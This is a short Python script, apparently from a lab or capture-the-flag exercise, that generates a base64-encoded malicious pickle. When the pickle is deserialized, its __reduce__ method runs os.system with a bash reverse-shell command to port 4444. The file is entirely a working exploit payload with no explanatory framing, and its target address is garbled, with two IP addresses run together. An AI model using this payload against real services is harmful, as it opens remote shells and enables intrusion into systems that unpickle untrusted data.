import os
import pickle
import base64

class RCE:
    def __reduce__(self):
    	cmd = ('bash -i >& /dev/tcp/172.24.0.4172.25.0.2/4444 0>&1')
    	return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled).decode())


